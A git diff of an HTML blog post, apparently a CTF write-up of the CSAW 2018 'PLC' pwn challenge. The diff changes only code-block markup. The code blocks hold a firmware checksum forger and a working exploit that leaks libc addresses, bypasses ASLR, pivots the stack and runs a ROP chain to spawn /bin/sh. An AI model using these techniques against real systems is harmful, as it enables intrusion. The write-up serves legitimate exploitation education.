@@ -126,7 +126,7 @@ This was the first ROP (okay, spoiler, it’s a ROP) I ever pulled off live duri
 	</header>
 	<article><blockquote>
 <p>We’ve burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines.</p>
-<p>You can access this challenge at <a href="https://wargames.ret2.systems/csaw_2018_plc_challenge" class="uri">https://wargames.ret2.systems/csaw_2018_plc_challenge</a></p>
+<p>You can access this challenge at <a href="https://wargames.ret2.systems/csaw_2018_plc_challenge">https://wargames.ret2.systems/csaw_2018_plc_challenge</a></p>
 </blockquote>
 <p>A much belated post. This is a pwn challenge on a custom online wargaming platform. We are provided with the assembly of what’s ostensibly a programmable logic controller (PLC) for a centrifuge in a nuclear reactor. The challenge looks like it’s still up, so you can take a look and follow along.</p>
 <p>This was the first <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> (okay, spoiler, it’s a ROP) I ever pulled off live during an actual CTF, which I was pretty excited about. The web platform meant I had to worry less about setup, and even though some of the tools it provided were a little lacking (no gdb shortcuts like <code>until</code>, no pwntools utilities for packing/unpacking numbers, … no <code>one_gadget</code>), I think they ultimately made the whole thing a lot more educational for me, so kudos to the folks behind it. I’ve included a brief description of all the exploit techniques that lead up to ROP when we get to that, so hopefully this post will be useful even if you don’t know much about pwning binaries. The prerequisites would be some knowledge with x86 assembly, how executables are loaded into memory, and how to use <code>gdb</code> (or fictionalized web knockoffs thereof).</p>
@@ -272,17 +272,17 @@ This was the first ROP (okay, spoiler, it’s a ROP) I ever pulled off live duri
 </ul></li>
 </ul>
 <p>A bit involved but nothing terribly complicated. Anyway, armed with this we can write any firmware we want and attach a version, checksum, and prefix <code>FW</code> that the PLC will happily update to. This gets us past checkpoints 2 and 3 without cheating. In vanilla python (no pwntools) it looks like this:</p>
-<pre class="sourceCode python"><code class="sourceCode python"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="co"># Build a length-0x400 firmware with placeholders for the checksum bytes</span></div>
-<div class="sourceLine" id="2" href="#2" data-line-number="2">program <span class="op">=</span> <span class="st">&#39;FWxx99&#39;</span> <span class="op">+</span> <span class="st">&#39;7&#39;</span> <span class="op">*</span> (<span class="bn">0x400</span> <span class="op">-</span> <span class="dv">6</span>)</div>
-<div class="sourceLine" id="3" href="#3" data-line-number="3"></div>
-<div class="sourceLine" id="4" href="#4" data-line-number="4">checksum <span class="op">=</span> <span class="dv">0</span></div>
-<div class="sourceLine" id="5" href="#5" data-line-number="5"><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">2</span>, <span class="bu">len</span>(program)<span class="op">//</span><span class="dv">2</span>):</div>
-<div class="sourceLine" id="6" href="#6" data-line-number="6">    checksum <span class="op">=</span> ((checksum <span class="op">&lt;&lt;</span> <span class="dv">12</span>) <span class="op">|</span> (checksum <span class="op">&gt;&gt;</span> <span class="dv">4</span>)) <span class="op">&amp;</span> <span class="bn">0xffff</span></div>
-<div class="sourceLine" id="7" href="#7" data-line-number="7">    checksum <span class="op">+=</span> i</div>
-<div class="sourceLine" id="8" href="#8" data-line-number="8">    checksum <span class="op">&amp;=</span> <span class="bn">0xffff</span></div>
-<div class="sourceLine" id="9" href="#9" data-line-number="9">    checksum <span class="op">^=</span> (<span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i<span class="op">+</span><span class="dv">1</span>]) <span class="op">&lt;&lt;</span> <span class="dv">8</span>) <span class="op">|</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i])</div>
-<div class="sourceLine" id="10" href="#10" data-line-number="10"></div>
-<div class="sourceLine" id="11" href="#11" data-line-number="11">program <span class="op">=</span> program[:<span class="dv">2</span>] <span class="op">+</span> <span class="bu">chr</span>(checksum <span class="op">&amp;</span> <span class="bn">0xFF</span>) <span class="op">+</span> <span class="bu">chr</span>((checksum <span class="op">&gt;&gt;</span> <span class="dv">8</span>) <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">+</span> program[<span class="dv">4</span>:]</div></code></pre>
+<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb14-1" data-line-number="1"><span class="co"># Build a length-0x400 firmware with placeholders for the checksum bytes</span></a>
+<a class="sourceLine" id="cb14-2" data-line-number="2">program <span class="op">=</span> <span class="st">&#39;FWxx99&#39;</span> <span class="op">+</span> <span class="st">&#39;7&#39;</span> <span class="op">*</span> (<span class="bn">0x400</span> <span class="op">-</span> <span class="dv">6</span>)</a>
+<a class="sourceLine" id="cb14-3" data-line-number="3"></a>
+<a class="sourceLine" id="cb14-4" data-line-number="4">checksum <span class="op">=</span> <span class="dv">0</span></a>
+<a class="sourceLine" id="cb14-5" data-line-number="5"><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">2</span>, <span class="bu">len</span>(program)<span class="op">//</span><span class="dv">2</span>):</a>
+<a class="sourceLine" id="cb14-6" data-line-number="6">    checksum <span class="op">=</span> ((checksum <span class="op">&lt;&lt;</span> <span class="dv">12</span>) <span class="op">|</span> (checksum <span class="op">&gt;&gt;</span> <span class="dv">4</span>)) <span class="op">&amp;</span> <span class="bn">0xffff</span></a>
+<a class="sourceLine" id="cb14-7" data-line-number="7">    checksum <span class="op">+=</span> i</a>
+<a class="sourceLine" id="cb14-8" data-line-number="8">    checksum <span class="op">&amp;=</span> <span class="bn">0xffff</span></a>
+<a class="sourceLine" id="cb14-9" data-line-number="9">    checksum <span class="op">^=</span> (<span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i<span class="op">+</span><span class="dv">1</span>]) <span class="op">&lt;&lt;</span> <span class="dv">8</span>) <span class="op">|</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i])</a>
+<a class="sourceLine" id="cb14-10" data-line-number="10"></a>
+<a class="sourceLine" id="cb14-11" data-line-number="11">program <span class="op">=</span> program[:<span class="dv">2</span>] <span class="op">+</span> <span class="bu">chr</span>(checksum <span class="op">&amp;</span> <span class="bn">0xFF</span>) <span class="op">+</span> <span class="bu">chr</span>((checksum <span class="op">&gt;&gt;</span> <span class="dv">8</span>) <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">+</span> program[<span class="dv">4</span>:]</a></code></pre></div>
 <h3 id="execute_firmware-and-the-overflow"><code>execute_firmware</code> and the Overflow</h3>
 <p>Now we’re at the meat of the PLC, which executes the firmware as some kind of virtual bytecode. It is very long, so I won’t go into the reversing details, but:</p>
 <ul>
@@ -342,115 +342,115 @@ This was the first ROP (okay, spoiler, it’s a ROP) I ever pulled off live duri
 <pre><code>0x7f0000228000-0x7f00003e8000 r-x 2.23-0ubuntu10</code></pre>
 <p>So at runtime the <code>pop rax ; ret</code> gadget will be at the address <code>0x7f0000228000 + 0x33544</code>. With ASLR on, we just take this and add the difference between the old address of <code>abort</code> in <code>libc</code> (which turned out to be <code>0x7f000025eec0</code>), collected and hardcoded into our exploit when ASLR was off, and the new one recently leaked during the current run. The same thing is done with <code>&quot;/bin/sh&quot;</code>, which can be found in libc using the debugger’s <code>find</code> command.</p>
 <p>Our finished exploit, to be pasted in the wargaming environment’s Python window, looks as follows. It’s not the prettiest code and there are definitely a lot of improvements I would make now — for example, although we don’t have pwntools’ packing and unpacking functions, Python’s built-in <code>struct</code> module has functions that we can use with just a little finagling.</p>
-<pre class="sourceCode python"><code class="sourceCode python"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="im">import</span> interact</div>
-<div class="sourceLine" id="2" href="#2" data-line-number="2"></div>
-<div class="sourceLine" id="3" href="#3" data-line-number="3">p <span class="op">=</span> interact.Process()</div>
-<div class="sourceLine" id="4" href="#4" data-line-number="4"><span class="cf">for</span> _ <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">5</span>):</div>
-<div class="sourceLine" id="5" href="#5" data-line-number="5">    p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</div>
-<div class="sourceLine" id="6" href="#6" data-line-number="6"></div>
-<div class="sourceLine" id="7" href="#7" data-line-number="7"><span class="kw">def</span> run_firmware(program, execute_cmd<span class="op">=</span><span class="st">&#39;E&#39;</span>, last_rd<span class="op">=</span><span class="va">True</span>):</div>
-<div class="sourceLine" id="8" href="#8" data-line-number="8">    program <span class="op">=</span> <span class="st">&#39;FWxx99&#39;</span> <span class="op">+</span> program <span class="op">+</span> <span class="st">&#39;9&#39;</span> <span class="op">*</span> <span class="bn">0x400</span></div>
-<div class="sourceLine" id="9" href="#9" data-line-number="9">    program <span class="op">=</span> program[:<span class="bn">0x400</span>]</div>
-<div class="sourceLine" id="10" href="#10" data-line-number="10"></div>
-<div class="sourceLine" id="11" href="#11" data-line-number="11">    checksum <span class="op">=</span> <span class="dv">0</span></div>
-<div class="sourceLine" id="12" href="#12" data-line-number="12">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">2</span>, <span class="bu">len</span>(program)<span class="op">//</span><span class="dv">2</span>):</div>
-<div class="sourceLine" id="13" href="#13" data-line-number="13">        checksum <span class="op">=</span> ((checksum <span class="op">&lt;&lt;</span> <span class="dv">12</span>) <span class="op">|</span> (checksum <span class="op">&gt;&gt;</span> <span class="dv">4</span>)) <span class="op">&amp;</span> <span class="bn">0xffff</span></div>
-<div class="sourceLine" id="14" href="#14" data-line-number="14">        checksum <span class="op">+=</span> i</div>
-<div class="sourceLine" id="15" href="#15" data-line-number="15">        checksum <span class="op">&amp;=</span> <span class="bn">0xffff</span></div>
-<div class="sourceLine" id="16" href="#16" data-line-number="16">        checksum <span class="op">^=</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i]) <span class="op">|</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i<span class="op">+</span><span class="dv">1</span>]) <span class="op">&lt;&lt;</span> <span class="dv">8</span></div>
-<div class="sourceLine" id="17" href="#17" data-line-number="17">    program <span class="op">=</span> (program[:<span class="dv">2</span>] <span class="op">+</span> <span class="bu">chr</span>(checksum <span class="op">&amp;</span> <span class="bn">0xff</span>)</div>
-<div class="sourceLine" id="18" href="#18" data-line-number="18">        <span class="op">+</span> <span class="bu">chr</span>((checksum <span class="op">&gt;&gt;</span> <span class="dv">8</span>) <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">+</span> program[<span class="dv">4</span>:])</div>
-<div class="sourceLine" id="19" href="#19" data-line-number="19"></div>
-<div class="sourceLine" id="20" href="#20" data-line-number="20">    p.sendline(<span class="st">&#39;U&#39;</span>)</div>
-<div class="sourceLine" id="21" href="#21" data-line-number="21">    p.sendline(program)</div>
-<div class="sourceLine" id="22" href="#22" data-line-number="22">    p.flush()</div>
-<div class="sourceLine" id="23" href="#23" data-line-number="23">    p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</div>
-<div class="sourceLine" id="24" href="#24" data-line-number="24">    p.sendline(execute_cmd)</div>
-<div class="sourceLine" id="25" href="#25" data-line-number="25">    p.flush()</div>
-<div class="sourceLine" id="26" href="#26" data-line-number="26">    <span class="cf">if</span> last_rd: p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</div>
-<div class="sourceLine" id="27" href="#27" data-line-number="27"></div>
-<div class="sourceLine" id="28" href="#28" data-line-number="28"><span class="kw">def</span> write_material(mat):</div>
-<div class="sourceLine" id="29" href="#29" data-line-number="29">    run_firmware(<span class="st">&#39;&#39;</span>.join(<span class="st">&#39;2&#39;</span><span class="op">+</span>c <span class="cf">for</span> c <span class="kw">in</span> mat))</div>
-<div class="sourceLine" id="30" href="#30" data-line-number="30"></div>
-<div class="sourceLine" id="31" href="#31" data-line-number="31"><span class="kw">def</span> read_material():</div>
-<div class="sourceLine" id="32" href="#32" data-line-number="32">    p.sendline(<span class="st">&#39;S&#39;</span>)</div>
-<div class="sourceLine" id="33" href="#33" data-line-number="33">    p.flush()</div>
-<div class="sourceLine" id="34" href="#34" data-line-number="34"></div>
-<div class="sourceLine" id="35" href="#35" data-line-number="35">    output <span class="op">=</span> []</div>
-<div class="sourceLine" id="36" href="#36" data-line-number="36">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</div>
-<div class="sourceLine" id="37" href="#37" data-line-number="37">        output.append(p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)[:<span class="op">-</span><span class="dv">1</span>])</div>
-<div class="sourceLine" id="38" href="#38" data-line-number="38">    material_readout <span class="op">=</span> output[<span class="op">-</span><span class="dv">2</span>]</div>
-<div class="sourceLine" id="39" href="#39" data-line-number="39">    <span class="cf">assert</span> <span class="st">&#39;ENRICHMENT MATERIAL&#39;</span> <span class="kw">in</span> material_readout</div>
-<div class="sourceLine" id="40" href="#40" data-line-number="40">    material_readout <span class="op">=</span> material_readout.split(<span class="st">&#39;: &#39;</span>, <span class="dv">1</span>)[<span class="dv">1</span>]</div>
-<div class="sourceLine" id="41" href="#41" data-line-number="41">    <span class="cf">return</span> material_readout</div>
-<div class="sourceLine" id="42" href="#42" data-line-number="42"></div>
-<div class="sourceLine" id="43" href="#43" data-line-number="43">write_material(<span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x44</span>)</div>
-<div class="sourceLine" id="44" href="#44" data-line-number="44">material_readout <span class="op">=</span> read_material()</div>
-<div class="sourceLine" id="45" href="#45" data-line-number="45"><span class="cf">assert</span> material_readout[:<span class="bn">0x44</span>] <span class="op">==</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x44</span></div>
-<div class="sourceLine" id="46" href="#46" data-line-number="46"></div>
-<div class="sourceLine" id="47" href="#47" data-line-number="47"><span class="kw">def</span> base256_to_int(xs):</div>
-<div class="sourceLine" id="48" href="#48" data-line-number="48">    n <span class="op">=</span> <span class="dv">0</span></div>
-<div class="sourceLine" id="49" href="#49" data-line-number="49">    <span class="cf">for</span> x <span class="kw">in</span> <span class="bu">reversed</span>(xs):</div>
-<div class="sourceLine" id="50" href="#50" data-line-number="50">        n <span class="op">=</span> <span class="dv">256</span> <span class="op">*</span> n <span class="op">+</span> x</div>
-<div class="sourceLine" id="51" href="#51" data-line-number="51">    <span class="cf">return</span> n</div>
-<div class="sourceLine" id="52" href="#52" data-line-number="52"></div>
-<div class="sourceLine" id="53" href="#53" data-line-number="53">rpm_alert_addr <span class="op">=</span> material_readout[<span class="bn">0x44</span>:]</div>
-<div class="sourceLine" id="54" href="#54" data-line-number="54"><span class="cf">while</span> <span class="bu">len</span>(rpm_alert_addr) <span class="op">&lt;</span> <span class="dv">8</span>: rpm_alert_addr <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span></div>
-<div class="sourceLine" id="55" href="#55" data-line-number="55"><span class="bu">print</span>([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> rpm_alert_addr])</div>
-<div class="sourceLine" id="56" href="#56" data-line-number="56"></div>
-<div class="sourceLine" id="57" href="#57" data-line-number="57"><span class="bu">print</span>(base256_to_int([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> rpm_alert_addr]))</div>
-<div class="sourceLine" id="58" href="#58" data-line-number="58"></div>
-<div class="sourceLine" id="59" href="#59" data-line-number="59">write_material(<span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x4C</span>)</div>
-<div class="sourceLine" id="60" href="#60" data-line-number="60">material_readout <span class="op">=</span> read_material()</div>
-<div class="sourceLine" id="61" href="#61" data-line-number="61"><span class="cf">assert</span> material_readout[:<span class="bn">0x4C</span>] <span class="op">==</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x4C</span></div>
-<div class="sourceLine" id="62" href="#62" data-line-number="62"></div>
-<div class="sourceLine" id="63" href="#63" data-line-number="63">abort_addr <span class="op">=</span> material_readout[<span class="bn">0x4C</span>:]</div>
-<div class="sourceLine" id="64" href="#64" data-line-number="64"><span class="cf">while</span> <span class="bu">len</span>(abort_addr) <span class="op">&lt;</span> <span class="dv">8</span>: abort_addr <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span></div>
-<div class="sourceLine" id="65" href="#65" data-line-number="65"></div>
-<div class="sourceLine" id="66" href="#66" data-line-number="66"><span class="co"># haxx for null bytes in address, esp. with ASLR off:</span></div>
-<div class="sourceLine" id="67" href="#67" data-line-number="67"><span class="co"># abort_addr = abort_addr[:5] + &#39;\x7f&#39; + &#39;\0\0&#39;</span></div>
-<div class="sourceLine" id="68" href="#68" data-line-number="68"></div>
-<div class="sourceLine" id="69" href="#69" data-line-number="69">current_abort <span class="op">=</span> base256_to_int([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> abort_addr])</div>
-<div class="sourceLine" id="70" href="#70" data-line-number="70">aslr_off_abort <span class="op">=</span> 0x7f000025eec0L</div>
-<div class="sourceLine" id="71" href="#71" data-line-number="71">aslr_offset <span class="op">=</span> current_abort <span class="op">-</span> aslr_off_abort</div>
-<div class="sourceLine" id="72" href="#72" data-line-number="72"></div>
-<div class="sourceLine" id="73" href="#73" data-line-number="73"><span class="co"># given a ROP gadget address from the ROP tab, turn it into an</span></div>
-<div class="sourceLine" id="74" href="#74" data-line-number="74"><span class="co"># actual string of bytes that&#39;s an address</span></div>
-<div class="sourceLine" id="75" href="#75" data-line-number="75"><span class="kw">def</span> aslr_pos(pos):</div>
-<div class="sourceLine" id="76" href="#76" data-line-number="76">    n <span class="op">=</span> <span class="bn">0x7f0000228000</span> <span class="op">+</span> aslr_offset <span class="op">+</span> pos</div>
-<div class="sourceLine" id="77" href="#77" data-line-number="77">    <span class="bu">print</span> <span class="st">&#39;aslr_pos =&#39;</span>, <span class="bu">hex</span>(n)</div>
-<div class="sourceLine" id="78" href="#78" data-line-number="78">    ret <span class="op">=</span> []</div>
-<div class="sourceLine" id="79" href="#79" data-line-number="79">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</div>
-<div class="sourceLine" id="80" href="#80" data-line-number="80">        ret.append(<span class="bu">chr</span>(n <span class="op">%</span> <span class="dv">256</span>))</div>
-<div class="sourceLine" id="81" href="#81" data-line-number="81">        n <span class="op">//=</span> <span class="dv">256</span></div>
-<div class="sourceLine" id="82" href="#82" data-line-number="82">    <span class="cf">return</span> <span class="st">&#39;&#39;</span>.join(ret)</div>
-<div class="sourceLine" id="83" href="#83" data-line-number="83"></div>
-<div class="sourceLine" id="84" href="#84" data-line-number="84"><span class="co"># add rsp, 0x38</span></div>
-<div class="sourceLine" id="85" href="#85" data-line-number="85"><span class="co"># puts stack pointer at cmd + 0x10, hopefully.</span></div>
-<div class="sourceLine" id="86" href="#86" data-line-number="86">stack_pivot <span class="op">=</span> aslr_pos(<span class="bn">0xc96a6</span>)</div>
-<div class="sourceLine" id="87" href="#87" data-line-number="87"><span class="bu">print</span> <span class="st">&#39;stack pivot&#39;</span>, <span class="bu">repr</span>(stack_pivot)</div>
-<div class="sourceLine" id="88" href="#88" data-line-number="88"></div>
-<div class="sourceLine" id="89" href="#89" data-line-number="89"><span class="co"># run_firmware(&#39;7&#39; * 100)</span></div>
-<div class="sourceLine" id="90" href="#90" data-line-number="90"></div>
-<div class="sourceLine" id="91" href="#91" data-line-number="91"><span class="kw">def</span> run_and_jump(addr, execute_cmd):</div>
-<div class="sourceLine" id="92" href="#92" data-line-number="92">    run_firmware(<span class="st">&#39;&#39;</span>.join(<span class="st">&#39;2&#39;</span><span class="op">+</span>c <span class="cf">for</span> c <span class="kw">in</span> <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="bn">0x44</span> <span class="op">+</span> addr) <span class="op">+</span> <span class="st">&#39;7&#39;</span> <span class="op">*</span> <span class="dv">100</span>,</div>
-<div class="sourceLine" id="93" href="#93" data-line-number="93">        execute_cmd, last_rd <span class="op">=</span> <span class="va">False</span>)</div>
-<div class="sourceLine" id="94" href="#94" data-line-number="94"></div>
-<div class="sourceLine" id="95" href="#95" data-line-number="95"><span class="bu">print</span>(<span class="st">&quot;wow!&quot;</span>)</div>
-<div class="sourceLine" id="96" href="#96" data-line-number="96"><span class="co"># run_and_jump(abort_addr)</span></div>
-<div class="sourceLine" id="97" href="#97" data-line-number="97">run_and_jump(stack_pivot, <span class="st">&#39;E&#39;</span> <span class="op">*</span> <span class="dv">16</span></div>
-<div class="sourceLine" id="98" href="#98" data-line-number="98">    <span class="op">+</span> aslr_pos(<span class="bn">0x33544</span>) <span class="co"># pop rax ; ret</span></div>
-<div class="sourceLine" id="99" href="#99" data-line-number="99">    <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\x3b\0\0\0\0\0\0\0</span><span class="st">&#39;</span></div>
-<div class="sourceLine" id="100" href="#100" data-line-number="100">    <span class="op">+</span> aslr_pos(<span class="bn">0x21102</span>) <span class="co"># pop rdi ; ret</span></div>
-<div class="sourceLine" id="101" href="#101" data-line-number="101">    <span class="op">+</span> aslr_pos(<span class="bn">0x3b4d57</span> <span class="op">-</span> <span class="bn">0x228000</span>) <span class="co"># &quot;/bin/sh&quot;</span></div>
-<div class="sourceLine" id="102" href="#102" data-line-number="102">    <span class="op">+</span> aslr_pos(<span class="bn">0x1150c9</span>) <span class="co"># pop rdx ; pop rsi ; ret</span></div>
-<div class="sourceLine" id="103" href="#103" data-line-number="103">    <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">16</span></div>
-<div class="sourceLine" id="104" href="#104" data-line-number="104">    <span class="op">+</span> aslr_pos(<span class="bn">0xbc375</span>) <span class="co"># syscall ; ret</span></div>
-<div class="sourceLine" id="105" href="#105" data-line-number="105">    )</div>
-<div class="sourceLine" id="106" href="#106" data-line-number="106"></div>
-<div class="sourceLine" id="107" href="#107" data-line-number="107">p.sendline(<span class="st">&quot;ls&quot;</span>)</div>
-<div class="sourceLine" id="108" href="#108" data-line-number="108"></div>
-<div class="sourceLine" id="109" href="#109" data-line-number="109">p.interactive()</div></code></pre>
+<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb17-1" data-line-number="1"><span class="im">import</span> interact</a>
+<a class="sourceLine" id="cb17-2" data-line-number="2"></a>
+<a class="sourceLine" id="cb17-3" data-line-number="3">p <span class="op">=</span> interact.Process()</a>
+<a class="sourceLine" id="cb17-4" data-line-number="4"><span class="cf">for</span> _ <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">5</span>):</a>
+<a class="sourceLine" id="cb17-5" data-line-number="5">    p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</a>
+<a class="sourceLine" id="cb17-6" data-line-number="6"></a>
+<a class="sourceLine" id="cb17-7" data-line-number="7"><span class="kw">def</span> run_firmware(program, execute_cmd<span class="op">=</span><span class="st">&#39;E&#39;</span>, last_rd<span class="op">=</span><span class="va">True</span>):</a>
+<a class="sourceLine" id="cb17-8" data-line-number="8">    program <span class="op">=</span> <span class="st">&#39;FWxx99&#39;</span> <span class="op">+</span> program <span class="op">+</span> <span class="st">&#39;9&#39;</span> <span class="op">*</span> <span class="bn">0x400</span></a>
+<a class="sourceLine" id="cb17-9" data-line-number="9">    program <span class="op">=</span> program[:<span class="bn">0x400</span>]</a>
+<a class="sourceLine" id="cb17-10" data-line-number="10"></a>
+<a class="sourceLine" id="cb17-11" data-line-number="11">    checksum <span class="op">=</span> <span class="dv">0</span></a>
+<a class="sourceLine" id="cb17-12" data-line-number="12">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">2</span>, <span class="bu">len</span>(program)<span class="op">//</span><span class="dv">2</span>):</a>
+<a class="sourceLine" id="cb17-13" data-line-number="13">        checksum <span class="op">=</span> ((checksum <span class="op">&lt;&lt;</span> <span class="dv">12</span>) <span class="op">|</span> (checksum <span class="op">&gt;&gt;</span> <span class="dv">4</span>)) <span class="op">&amp;</span> <span class="bn">0xffff</span></a>
+<a class="sourceLine" id="cb17-14" data-line-number="14">        checksum <span class="op">+=</span> i</a>
+<a class="sourceLine" id="cb17-15" data-line-number="15">        checksum <span class="op">&amp;=</span> <span class="bn">0xffff</span></a>
+<a class="sourceLine" id="cb17-16" data-line-number="16">        checksum <span class="op">^=</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i]) <span class="op">|</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i<span class="op">+</span><span class="dv">1</span>]) <span class="op">&lt;&lt;</span> <span class="dv">8</span></a>
+<a class="sourceLine" id="cb17-17" data-line-number="17">    program <span class="op">=</span> (program[:<span class="dv">2</span>] <span class="op">+</span> <span class="bu">chr</span>(checksum <span class="op">&amp;</span> <span class="bn">0xff</span>)</a>
+<a class="sourceLine" id="cb17-18" data-line-number="18">        <span class="op">+</span> <span class="bu">chr</span>((checksum <span class="op">&gt;&gt;</span> <span class="dv">8</span>) <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">+</span> program[<span class="dv">4</span>:])</a>
+<a class="sourceLine" id="cb17-19" data-line-number="19"></a>
+<a class="sourceLine" id="cb17-20" data-line-number="20">    p.sendline(<span class="st">&#39;U&#39;</span>)</a>
+<a class="sourceLine" id="cb17-21" data-line-number="21">    p.sendline(program)</a>
+<a class="sourceLine" id="cb17-22" data-line-number="22">    p.flush()</a>
+<a class="sourceLine" id="cb17-23" data-line-number="23">    p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</a>
+<a class="sourceLine" id="cb17-24" data-line-number="24">    p.sendline(execute_cmd)</a>
+<a class="sourceLine" id="cb17-25" data-line-number="25">    p.flush()</a>
+<a class="sourceLine" id="cb17-26" data-line-number="26">    <span class="cf">if</span> last_rd: p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</a>
+<a class="sourceLine" id="cb17-27" data-line-number="27"></a>
+<a class="sourceLine" id="cb17-28" data-line-number="28"><span class="kw">def</span> write_material(mat):</a>
+<a class="sourceLine" id="cb17-29" data-line-number="29">    run_firmware(<span class="st">&#39;&#39;</span>.join(<span class="st">&#39;2&#39;</span><span class="op">+</span>c <span class="cf">for</span> c <span class="kw">in</span> mat))</a>
+<a class="sourceLine" id="cb17-30" data-line-number="30"></a>
+<a class="sourceLine" id="cb17-31" data-line-number="31"><span class="kw">def</span> read_material():</a>
+<a class="sourceLine" id="cb17-32" data-line-number="32">    p.sendline(<span class="st">&#39;S&#39;</span>)</a>
+<a class="sourceLine" id="cb17-33" data-line-number="33">    p.flush()</a>
+<a class="sourceLine" id="cb17-34" data-line-number="34"></a>
+<a class="sourceLine" id="cb17-35" data-line-number="35">    output <span class="op">=</span> []</a>
+<a class="sourceLine" id="cb17-36" data-line-number="36">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</a>
+<a class="sourceLine" id="cb17-37" data-line-number="37">        output.append(p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)[:<span class="op">-</span><span class="dv">1</span>])</a>
+<a class="sourceLine" id="cb17-38" data-line-number="38">    material_readout <span class="op">=</span> output[<span class="op">-</span><span class="dv">2</span>]</a>
+<a class="sourceLine" id="cb17-39" data-line-number="39">    <span class="cf">assert</span> <span class="st">&#39;ENRICHMENT MATERIAL&#39;</span> <span class="kw">in</span> material_readout</a>
+<a class="sourceLine" id="cb17-40" data-line-number="40">    material_readout <span class="op">=</span> material_readout.split(<span class="st">&#39;: &#39;</span>, <span class="dv">1</span>)[<span class="dv">1</span>]</a>
+<a class="sourceLine" id="cb17-41" data-line-number="41">    <span class="cf">return</span> material_readout</a>
+<a class="sourceLine" id="cb17-42" data-line-number="42"></a>
+<a class="sourceLine" id="cb17-43" data-line-number="43">write_material(<span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x44</span>)</a>
+<a class="sourceLine" id="cb17-44" data-line-number="44">material_readout <span class="op">=</span> read_material()</a>
+<a class="sourceLine" id="cb17-45" data-line-number="45"><span class="cf">assert</span> material_readout[:<span class="bn">0x44</span>] <span class="op">==</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x44</span></a>
+<a class="sourceLine" id="cb17-46" data-line-number="46"></a>
+<a class="sourceLine" id="cb17-47" data-line-number="47"><span class="kw">def</span> base256_to_int(xs):</a>
+<a class="sourceLine" id="cb17-48" data-line-number="48">    n <span class="op">=</span> <span class="dv">0</span></a>
+<a class="sourceLine" id="cb17-49" data-line-number="49">    <span class="cf">for</span> x <span class="kw">in</span> <span class="bu">reversed</span>(xs):</a>
+<a class="sourceLine" id="cb17-50" data-line-number="50">        n <span class="op">=</span> <span class="dv">256</span> <span class="op">*</span> n <span class="op">+</span> x</a>
+<a class="sourceLine" id="cb17-51" data-line-number="51">    <span class="cf">return</span> n</a>
+<a class="sourceLine" id="cb17-52" data-line-number="52"></a>
+<a class="sourceLine" id="cb17-53" data-line-number="53">rpm_alert_addr <span class="op">=</span> material_readout[<span class="bn">0x44</span>:]</a>
+<a class="sourceLine" id="cb17-54" data-line-number="54"><span class="cf">while</span> <span class="bu">len</span>(rpm_alert_addr) <span class="op">&lt;</span> <span class="dv">8</span>: rpm_alert_addr <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span></a>
